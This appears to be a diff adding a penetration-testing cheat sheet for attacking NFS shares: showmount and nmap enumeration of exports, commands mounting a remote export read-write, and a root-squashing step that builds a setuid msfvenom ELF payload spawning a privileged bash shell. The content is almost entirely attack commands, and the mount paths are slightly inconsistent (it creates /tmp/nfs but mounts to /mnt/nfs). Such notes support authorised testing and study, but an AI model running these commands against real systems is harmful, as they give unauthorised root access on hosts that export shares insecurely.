@@ -1,0 +1,15 @@
+### NFS ###
+
+## showmount
+showmount -e $h
+
+## scan
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $h
+
+## mount
+mkdir /tmp/nfs && sudo mount -o rw,vers=2 $h:/tmp /mnt/nfs
+sudo mount -t nfs $h:/tmp /mnt/nfs -nolock
+
+## rootsquashing
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf && chmod +xs /tmp/nfs/shell.elf
+
